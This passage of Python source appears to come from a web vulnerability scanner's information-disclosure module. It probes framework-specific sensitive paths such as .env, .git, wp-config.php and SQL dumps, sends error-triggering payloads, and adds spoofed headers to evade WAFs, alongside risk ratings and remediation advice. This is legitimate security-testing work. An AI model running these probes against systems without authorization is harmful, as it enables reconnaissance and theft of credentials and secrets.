            compliance_risk=_assess_context_disclosure_compliance_risk(vulnerabilities, target_context)
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Information Disclosure Test",
            error=str(e),
            execution_time=time.time() - start_time
        )


def _get_context_aware_disclosure_paths(target_context: PayloadTargetContext) -> List[str]:
    """Generate context-aware list of sensitive paths to test"""
    base_paths = [
        '/.env', '/.git', '/.svn', '/robots.txt', '/sitemap.xml',
        '/swagger.json', '/api-docs', '/openapi.json',
        '/error_log', '/access.log', '/application.log'
    ]
    
    # Framework-specific paths
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            base_paths.extend([
                '/settings.py', '/local_settings.py', '/manage.py',
                '/requirements.txt', '/.env.local', '/db.sqlite3'
            ])
        elif framework == 'laravel':
            base_paths.extend([
                '/.env', '/.env.example', '/artisan', '/composer.json',
                '/config/app.php', '/config/database.php', '/storage/logs/laravel.log'
            ])
        elif framework == 'rails':
            base_paths.extend([
                '/config/database.yml', '/config/secrets.yml', '/Gemfile',
                '/config/application.rb', '/log/development.log'
            ])
        elif framework == 'express':
            base_paths.extend([
                '/package.json', '/.env', '/config.js', '/app.js',
                '/server.js', '/index.js'
            ])
        elif framework == 'asp.net':
            base_paths.extend([
                '/web.config', '/appsettings.json', '/Global.asax',
                '/packages.config', '/App_Data/'
            ])
    
    # Language-specific paths
    if target_context.language:
        language = target_context.language.lower()
        if language == 'php':
            base_paths.extend([
                '/phpinfo.php', '/info.php', '/config.php', '/config.inc.php',
                '/database.php', '/wp-config.php', '/configuration.php'
            ])
        elif language == 'python':
            base_paths.extend([
                '/requirements.txt', '/setup.py', '/__pycache__/',
                '/venv/', '/.venv/', '/pip.conf'
            ])
        elif language == 'java':
            base_paths.extend([
                '/WEB-INF/web.xml', '/META-INF/MANIFEST.MF',
                '/application.properties', '/pom.xml', '/build.gradle'
            ])
        elif language == 'nodejs':
            base_paths.extend([
                '/package.json', '/package-lock.json', '/yarn.lock',
                '/node_modules/', '/.npmrc'
            ])
    
    # CMS-specific paths
    if target_context.cms:
        cms = target_context.cms.lower()
        if cms == 'wordpress':
            base_paths.extend([
                '/wp-config.php', '/wp-admin/', '/wp-content/debug.log',
                '/wp-content/uploads/', '/.htaccess', '/readme.html'
            ])
        elif cms == 'drupal':
            base_paths.extend([
                '/sites/default/settings.php', '/CHANGELOG.txt',
                '/COPYRIGHT.txt', '/sites/default/files/'
            ])
        elif cms == 'joomla':
            base_paths.extend([
                '/configuration.php', '/administrator/', '/cache/',
                '/logs/', '/tmp/'
            ])
    
    # Web server specific paths
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server == 'apache':
            base_paths.extend([
                '/.htaccess', '/.htpasswd', '/httpd.conf',
                '/apache2.conf', '/sites-available/'
            ])
        elif server == 'nginx':
            base_paths.extend([
                '/nginx.conf', '/sites-available/', '/sites-enabled/',
                '/conf.d/'
            ])
        elif server == 'iis':
            base_paths.extend([
                '/web.config', '/applicationHost.config', '/iisstart.htm'
            ])
    
    # Database-specific backup files
    if target_context.database:
        db = target_context.database.lower()
        if db in ['mysql', 'mariadb']:
            base_paths.extend([
                '/backup.sql', '/database.sql', '/mysql.sql', '/dump.sql'
            ])
        elif db == 'postgresql':
            base_paths.extend([
                '/backup.pgsql', '/database.pgsql', '/dump.pgsql'
            ])
        elif db == 'sqlite':
            base_paths.extend([
                '/database.sqlite', '/db.sqlite3', '/data.db'
            ])
    
    return list(set(base_paths))  # Remove duplicates

def _setup_disclosure_authentication(session: requests.Session, target_context: PayloadTargetContext) -> requests.Session:
    """Setup authentication for disclosure testing"""
    if target_context.authentication_type and target_context.custom_headers:
        if target_context.authentication_type.lower() == 'bearer':
            auth_header = target_context.custom_headers.get('Authorization')
            if auth_header:
                session.headers.update({'Authorization': auth_header})
        elif target_context.authentication_type.lower() == 'cookie':
            cookie_header = target_context.custom_headers.get('Cookie')
            if cookie_header:
                session.headers.update({'Cookie': cookie_header})
        elif target_context.authentication_type.lower() == 'basic':
            auth_header = target_context.custom_headers.get('Authorization')
            if auth_header:
                session.headers.update({'Authorization': auth_header})
    
    # Add any custom headers
    if target_context.custom_headers:
        for header, value in target_context.custom_headers.items():
            if header.lower() not in ['authorization', 'cookie']:  # Already handled above
                session.headers.update({header: value})
    
    return session

def _execute_context_aware_request(session: requests.Session, url: str, target_context: PayloadTargetContext) -> requests.Response:
    """Execute request with context-aware settings"""
    try:
        headers = {}
        
        # Add framework-specific headers
        if target_context.framework:
            framework = target_context.framework.lower()
            if framework == 'django':
                headers['X-Requested-With'] = 'XMLHttpRequest'
            elif framework == 'laravel':
                headers['X-CSRF-TOKEN'] = 'test'
                headers['Accept'] = 'application/json'
            elif framework in ['express', 'nodejs']:
                headers['Content-Type'] = 'application/json'
        
        # WAF evasion headers if WAF detected
        if target_context.has_waf:
            headers.update({
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1'
            })
        
        response = session.get(url, headers=headers, timeout=10)
        return response
        
    except Exception as e:
        logging.error(f"Context-aware request failed for {url}: {e}")
        return None

def _assess_context_aware_file_risk(path: str, response: requests.Response, target_context: PayloadTargetContext) -> str:
    """Assess risk level with context awareness"""
    path_lower = path.lower()
    content_lower = response.text[:1000].lower()
    
    # Critical files - framework/language specific
    critical_patterns = ['.env', 'config', 'database', 'backup', '.git']
    
    # Add context-specific critical patterns
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            critical_patterns.extend(['settings.py', 'manage.py', 'local_settings'])
        elif framework == 'laravel':
            critical_patterns.extend(['artisan', '.env.example', 'config/app.php'])
        elif framework == 'rails':
            critical_patterns.extend(['database.yml', 'secrets.yml', 'application.rb'])
    
    if any(pattern in path_lower for pattern in critical_patterns):
        return 'Critical'
    
    # High risk with context
    high_patterns = ['admin', 'debug', 'test', 'phpinfo']
    if target_context.language == 'php':
        high_patterns.extend(['info.php', 'configuration.php'])
    
    if any(pattern in path_lower for pattern in high_patterns):
        return 'High'
    
    # Content analysis with context awareness
    sensitive_keywords = ['password', 'secret', 'key', 'token', 'database', 'config']
    if target_context.framework:
        if target_context.framework.lower() in ['django', 'laravel']:
            sensitive_keywords.extend(['app_key', 'secret_key', 'csrf_token'])
    
    if any(keyword in content_lower for keyword in sensitive_keywords):
        return 'High'
    
    # Medium risk
    if any(pattern in path_lower for pattern in ['robots.txt', 'sitemap', 'swagger', 'api-docs']):
        return 'Medium'
    
    return 'Low'

def _get_context_aware_disclosure_impact(path: str, target_context: PayloadTargetContext) -> str:
    """Get context-aware business impact description"""
    path_lower = path.lower()
    
    if '.env' in path_lower or 'config' in path_lower:
        base_impact = "Configuration and environment variables exposed"
        if target_context.framework:
            if target_context.framework.lower() in ['django', 'laravel', 'rails']:
                return f"{base_impact} - may contain database credentials, API keys, and framework secrets"
    
    if 'database' in path_lower or 'backup' in path_lower:
        return "Database backup or configuration exposed - potential data breach"
    
    if target_context.cms and 'wp-config' in path_lower:
        return "WordPress configuration exposed - database access and security keys compromised"
    
    if 'admin' in path_lower:
        return "Administrative interface exposed - potential unauthorized access"
    
    if any(pattern in path_lower for pattern in ['swagger', 'api-docs', 'openapi']):
        return "API documentation exposed - reveals internal endpoints and structure"
    
    return f"Sensitive information exposed via {path}"

def _get_context_aware_disclosure_remediation(path: str, target_context: PayloadTargetContext) -> str:
    """Get context-aware remediation advice"""
    path_lower = path.lower()
    
    if '.env' in path_lower:
        base_remediation = "Move .env files outside web root and ensure proper file permissions"
        if target_context.framework:
            if target_context.framework.lower() == 'laravel':
                return f"{base_remediation}. Use Laravel's config caching in production"
            elif target_context.framework.lower() == 'django':
                return f"{base_remediation}. Use Django's settings module pattern"
    
    if '.git' in path_lower:
        return "Add .git/ to .htaccess deny rules or move repository outside web root"
    
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server == 'apache' and '.htaccess' in path_lower:
            return "Secure .htaccess files with proper directory directives"
        elif server == 'nginx' and 'nginx.conf' in path_lower:
            return "Move Nginx configuration outside web-accessible directories"
    
    if target_context.cms == 'wordpress' and 'wp-config' in path_lower:
        return "Move wp-config.php above document root and set proper file permissions (644)"
    
    return "Remove sensitive files from web-accessible directories and implement proper access controls"

def _test_context_aware_error_disclosure(session: requests.Session, url: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test for framework-specific error disclosure"""
    vulnerabilities = []
    
    # Base error triggers
    error_triggers = ["/'", '/"', '/null', '/undefined', '/{invalid}']
    
    # Framework-specific error triggers
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            error_triggers.extend([
                '?debug=True', '/debug/', '/__debug__/',
                '/admin/login/?next=/nonexistent'
            ])
        elif framework == 'laravel':
            error_triggers.extend([
                '?APP_DEBUG=true', '/debug-toolbar/', '/telescope/',
                '/horizon/dashboard'
            ])
        elif framework == 'rails':
            error_triggers.extend([
                '?debug=1', '/rails/info/', '/rails/mailers/'
            ])
        elif framework in ['express', 'nodejs']:
            error_triggers.extend([
                '?NODE_ENV=development', '/debug/', '/__debugging'
            ])
    
    # Language-specific triggers
    if target_context.language:
        language = target_context.language.lower()
        if language == 'php':
            error_triggers.extend([
                '?XDEBUG_PROFILE=1', '/phpinfo.php', '?error_reporting=E_ALL'
            ])
        elif language == 'python':
            error_triggers.extend([
                '?PYTHONDONTWRITEBYTECODE=1', '/__pycache__/'
            ])
    
    for trigger in error_triggers:
        try:
            test_url = url + trigger
            response = session.get(test_url)
            
            if _contains_context_aware_error_disclosure(response.text, target_context):
                vuln = create_vulnerability(
                    vuln_type='Context-aware Error Disclosure',
                    severity='Medium',
                    evidence=f'Framework-specific error information revealed via {trigger}',
                    url=test_url,
                    payload=trigger,
                    response_code=response.status_code,
                    technique='Context-aware error analysis',
                    business_impact=_get_framework_error_impact(target_context),
                    remediation=_get_framework_error_remediation(target_context)
                )
                vulnerabilities.append(vuln)
                
        except Exception:
            pass
    
    return vulnerabilities

def _test_context_aware_header_disclosure(session: requests.Session, url: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test HTTP headers with context awareness"""
    vulnerabilities = []
    
    try:
        response = session.get(url)
        
        # Base sensitive headers
        sensitive_headers = {
            'server': 'Server version disclosure',
            'x-powered-by': 'Technology stack disclosure'
        }
        
        # Framework-specific headers
        if target_context.framework:
            framework = target_context.framework.lower()
            if framework == 'django':
                sensitive_headers.update({
                    'x-django-version': 'Django version disclosure',
                    'x-debug-toolbar': 'Debug toolbar enabled'
                })
            elif framework == 'laravel':
                sensitive_headers.update({
                    'x-laravel-version': 'Laravel version disclosure',
                    'x-telescope-request-id': 'Telescope debugging enabled'
                })
            elif framework == 'express':
                sensitive_headers.update({
                    'x-express-version': 'Express.js version disclosure'
                })
            elif framework == 'asp.net':
                sensitive_headers.update({
                    'x-aspnet-version': 'ASP.NET version disclosure',
                    'x-aspnetmvc-version': 'ASP.NET MVC version disclosure'
                })
        
        # Check for context-specific headers
        for header, description in sensitive_headers.items():
            if header in response.headers:
                severity = _assess_header_disclosure_severity(header, target_context)
                vuln = create_vulnerability(
                    vuln_type='Context-aware Header Disclosure',
                    severity=severity,
                    evidence=f'{description}: {response.headers[header]}',
                    url=url,
                    location=f'{header} header',
                    technique='Context-aware header analysis',
                    business_impact=_get_header_disclosure_impact(header, target_context),
                    remediation=_get_header_disclosure_remediation(header, target_context)
                )
                vulnerabilities.append(vuln)
                
    except Exception:
        pass
    
    return vulnerabilities

def _test_technology_specific_disclosure(session: requests.Session, url: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test for technology-specific information disclosure"""
    vulnerabilities = []
    
    # CMS-specific tests
    if target_context.cms:
        cms = target_context.cms.lower()
        if cms == 'wordpress':
            wp_paths = ['/wp-json/wp/v2/users', '/readme.html', '/license.txt']
            for path in wp_paths:
                try:
                    response = session.get(url + path)
                    if response.status_code == 200:
                        vuln = create_vulnerability(
                            vuln_type='WordPress Information Disclosure',
                            severity='Medium',
                            evidence=f'WordPress endpoint accessible: {path}',
                            url=url + path,
                            technique='CMS-specific disclosure',
                            business_impact='WordPress installation details exposed',
                            remediation='Restrict access to WordPress metadata endpoints'
                        )
                        vulnerabilities.append(vuln)
                except Exception:
                    pass
    
    # Database-specific disclosure tests
    if target_context.database:
        db = target_context.database.lower()
        if db in ['mysql', 'postgresql']:
            # Test for database error messages in responses
            try:
                response = session.get(url + "?id=1'")
                if any(db_error in response.text.lower() for db_error in 
                      ['mysql', 'postgresql', 'you have an error in your sql syntax']):
                    vuln = create_vulnerability(
                        vuln_type='Database Error Disclosure',
                        severity='High',
                        evidence=f'{db.upper()} error messages exposed',
                        url=url + "?id=1'",
                        technique='Database error analysis',
                        business_impact='Database technology and structure revealed',
                        remediation='Implement generic error pages and disable detailed database errors'
                    )
                    vulnerabilities.append(vuln)
            except Exception:
                pass
    
    return vulnerabilities

def _contains_context_aware_error_disclosure(response_text: str, target_context: PayloadTargetContext) -> bool:
    """Check for context-aware error disclosure patterns"""
    response_lower = response_text.lower()
    
    # Base error patterns
    base_patterns = ['stack trace', 'exception', 'error', 'warning:', 'notice:', 'fatal error']
    
    # Framework-specific patterns
    framework_patterns = []
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            framework_patterns.extend(['django.core', 'traceback', 'debug=true'])
        elif framework == 'laravel':
            framework_patterns.extend(['illuminate\\', 'laravel framework', 'whoops'])
        elif framework == 'rails':
            framework_patterns.extend(['actioncontroller', 'activerecord', 'railties'])
        elif framework in ['express', 'nodejs']:
            framework_patterns.extend(['node.js', 'express', 'at module.'])
    
    # Language-specific patterns
    if target_context.language:
        language = target_context.language.lower()
        if language == 'php':
            framework_patterns.extend(['php version', 'fatal error', 'parse error'])
        elif language == 'python':
            framework_patterns.extend(['python', 'traceback', 'line '])
        elif language == 'java':
            framework_patterns.extend(['java.lang', 'exception in thread'])
    
    all_patterns = base_patterns + framework_patterns
    return any(pattern in response_lower for pattern in all_patterns)

def _get_framework_error_impact(target_context: PayloadTargetContext) -> str:
    """Get framework-specific error impact description"""
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            return "Django debug information exposed - reveals application structure and sensitive paths"
        elif framework == 'laravel':
            return "Laravel error details exposed - may reveal application secrets and file paths"
        elif framework == 'rails':
            return "Rails stack trace exposed - reveals application structure and gem dependencies"
    return "Framework-specific error information exposed"

def _get_framework_error_remediation(target_context: PayloadTargetContext) -> str:
    """Get framework-specific error remediation"""
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'django':
            return "Set DEBUG=False in production and configure custom error pages"
        elif framework == 'laravel':
            return "Set APP_DEBUG=false in production .env file and configure error handling"
        elif framework == 'rails':
            return "Set config.consider_all_requests_local = false in production"
    return "Disable debug mode and implement custom error pages"

def _assess_header_disclosure_severity(header: str, target_context: PayloadTargetContext) -> str:
    """Assess severity of header disclosure based on context"""
    header_lower = header.lower()
    
    # Framework version headers are higher risk
    if target_context.framework and target_context.framework.lower() in header_lower:
        return 'Medium'
    
    # Debug-related headers are high risk
    if 'debug' in header_lower or 'toolbar' in header_lower:
        return 'High'
    
    # General server info
    if header_lower in ['server', 'x-powered-by']:
        return 'Low'
    
    return 'Low'

def _get_header_disclosure_impact(header: str, target_context: PayloadTargetContext) -> str:
    """Get context-aware header disclosure impact"""
    header_lower = header.lower()
    
    if 'debug' in header_lower:
        return "Debug mode enabled - application internals exposed"
    
    if target_context.framework and target_context.framework.lower() in header_lower:
        return f"{target_context.framework} version exposed - enables targeted attacks"
    
    return "Technology stack information exposed for reconnaissance"

def _get_header_disclosure_remediation(header: str, target_context: PayloadTargetContext) -> str:
    """Get context-aware header disclosure remediation"""
    header_lower = header.lower()
    
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server == 'apache':
            return f"Add 'Header unset {header}' to Apache configuration"
        elif server == 'nginx':
            return f"Use 'more_clear_headers {header}' in Nginx configuration"
    
    if 'debug' in header_lower:
        return "Disable debug mode in production environment"
    
    return f"Remove or modify the {header} header to avoid information disclosure"

def _assess_context_disclosure_business_impact(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess business impact with context awareness"""
    if not vulnerabilities:
        return "LOW - No information disclosure vulnerabilities found"
    
    critical_count = sum(1 for v in vulnerabilities if (isinstance(v, Vulnerability) and v.severity == 'Critical') or (isinstance(v, dict) and v.get('severity') == 'Critical'))
    high_count = sum(1 for v in vulnerabilities if (isinstance(v, Vulnerability) and v.severity == 'High') or (isinstance(v, dict) and v.get('severity') == 'High'))
    
    if critical_count > 0:
        impact = "CRITICAL - Sensitive configuration and credentials exposed"
        if target_context.framework in ['django', 'laravel', 'rails']:
            impact += f" - {target_context.framework} secrets may be compromised"
    elif high_count > 0:
        impact = "HIGH - Administrative interfaces and debug information exposed"
        if target_context.cms:
            impact += f" - {target_context.cms} installation details revealed"
    else:
        impact = "MEDIUM - Technology stack and reconnaissance information exposed"
    
    return impact

def _assess_context_disclosure_compliance_risk(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess compliance risk with context awareness"""
    if not vulnerabilities:
        return "LOW - No compliance risks identified"
    
    has_critical = any((isinstance(v, Vulnerability) and v.severity == 'Critical') or (isinstance(v, dict) and v.get('severity') == 'Critical') for v in vulnerabilities)
    
    risk_factors = []
    
    if has_critical:
        risk_factors.append("Data privacy violations (GDPR, CCPA)")
    
    if target_context.framework in ['django', 'laravel', 'rails']:
        risk_factors.append("Web application security standards (OWASP)")
    
    if target_context.cms:
        risk_factors.append("CMS security best practices compliance")
    
    if any('database' in str(v).lower() for v in vulnerabilities):
        risk_factors.append("Database security compliance (PCI-DSS if applicable)")
    
    if risk_factors:
        return "HIGH - " + ", ".join(risk_factors)
    
    return "MEDIUM - General security compliance concerns"





